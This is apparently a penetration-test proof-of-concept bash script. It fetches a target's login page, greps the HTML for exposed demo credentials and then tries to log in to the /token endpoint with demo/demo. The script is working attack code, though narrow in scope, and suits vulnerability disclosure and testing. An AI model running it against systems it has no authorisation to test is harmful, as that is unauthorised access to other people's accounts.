#!/bin/bash

# POC: Publicly Displayed Credentials on Login Page
# This script demonstrates that demo credentials are exposed in the HTML of the login page

TARGET_URL="${1:-http://localhost:8080}"
TEMP_FILE=$(mktemp)

echo "[*] Testing for publicly displayed demo credentials on login page"
echo "[*] Target: $TARGET_URL"
echo ""

# Fetch the login page HTML
echo "[*] Fetching login page HTML..."
curl -s "$TARGET_URL" > "$TEMP_FILE"

# Check if demo credentials are visible in the HTML
echo "[*] Searching for demo credentials in HTML..."
if grep -i "demo" "$TEMP_FILE" | grep -iE "(username|password)" > /dev/null; then
    echo "[+] VULNERABLE: Demo credentials found in HTML"
    echo ""
    echo "[*] Extracted credential information:"
    grep -i "demo" "$TEMP_FILE" | grep -iE "(username|password|account)" | head -5
    echo ""
    
    # Try to use the demo credentials
    echo "[*] Attempting to authenticate with demo/demo credentials..."
    AUTH_RESPONSE=$(curl -s -X POST "$TARGET_URL/token" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=demo&password=demo")
    
    echo "[*] Authentication response:"
    echo "$AUTH_RESPONSE" | grep -o "Incorrect\|Invalid\|access_token\|token" || echo "$AUTH_RESPONSE"
    echo ""
    
    # Extract full HTML section containing credentials
    echo "[*] Full HTML section with credentials:"
    grep -i "demo" "$TEMP_FILE" | grep -iE "(username|password|account)" | sed 's/^/    /'
else
    echo "[-] Demo credentials not found in HTML (may be patched)"
fi

# Cleanup
rm -f "$TEMP_FILE"